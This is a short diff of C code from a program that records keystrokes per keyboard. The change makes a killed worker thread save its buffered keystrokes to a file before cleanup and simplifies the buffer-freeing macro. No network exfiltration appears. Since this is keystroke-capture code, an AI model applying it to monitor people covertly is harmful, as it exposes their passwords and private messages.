@@ -24,9 +24,8 @@
 #define RESETTING      "Resetting..."
 
 #ifndef KEYSTROKE_BUFFER_CLEANER
-#define KEYSTROKE_BUFFER_CLEANER(KEYSTROKE_BUFFER, SIZE) {                                \
-        for (int clean = 0; clean < SIZE; clean++) free(KEYSTROKE_BUFFER[clean]);         \
-        free(KEYSTROKE_BUFFER);                                                           \
+#define KEYSTROKE_BUFFER_CLEANER(KEYSTROKE_BUFFER) {    \
+        free(KEYSTROKE_BUFFER);                         \
 }
 #endif
 
@@ -53,7 +52,10 @@ static void killed_worker(void *arg) {
         make_terminal_log(DISCONNECTED, cleanup_infos->kb_worker->kb_id);
     }
     // Clean the keystroke buffer.
-    KEYSTROKE_BUFFER_CLEANER(cleanup_infos->keystroke_buffer, cleanup_infos->keystroke_buffer_s);
+    append_to_file((const char **) cleanup_infos->keystroke_buffer,
+                   cleanup_infos->keystroke_buffer_s, cleanup_infos->kb_worker->kb_id);
+
+    KEYSTROKE_BUFFER_CLEANER(cleanup_infos->keystroke_buffer);
 }
 
 _Noreturn void *start_worker(void *worker) {
@@ -105,7 +107,7 @@ _Noreturn void *start_worker(void *worker) {
                 // Save the contents of the buffer.
                 append_to_file((const char **) keystroke_buffer, keystroke_buffer_s, worker_infos->kb_id);
                 // Clear the buffer.
-                KEYSTROKE_BUFFER_CLEANER(keystroke_buffer, keystroke_buffer_s);
+                KEYSTROKE_BUFFER_CLEANER(keystroke_buffer);
                 // Realloc the buffer.
                 ALLOC_MEM(keystroke_buffer, 1, sizeof(char **));
                 keystroke_buffer_s = 1;
